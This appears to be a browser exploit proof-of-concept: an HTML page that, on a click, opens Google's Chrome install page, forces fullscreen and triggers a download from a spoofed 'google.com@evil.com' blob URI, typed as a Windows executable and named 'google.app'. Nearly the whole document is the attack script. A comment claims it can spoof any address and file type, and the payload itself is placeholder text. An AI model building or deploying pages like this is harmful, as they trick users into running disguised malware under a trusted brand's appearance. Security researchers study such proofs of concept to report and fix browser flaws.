<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC tested!</h2></center>
  <input type="text" id="triggerInput">
  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // request fullscreen
 setTimeout(function() {
        openWin();
 }, 500);
 window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
      goFullScreen();
    }, { once: false }); // Use { once: true } to ensure it only fires once
    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    // Kick off your “APK” download
    function openWin() {
      Puf(
        "blob:https://google.com@evil.com/.../application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=", // The payload data://[spoofed-address]/[foobar],[payload] allowed to spoof any address with any file type and with any payload.


        "google.app"
      );
    }
    function goFullScreen() {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) { // Firefox
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) { // IE/Edge
        element.msRequestFullscreen();

      }

    }

  </script>  

  
</body>
</html>
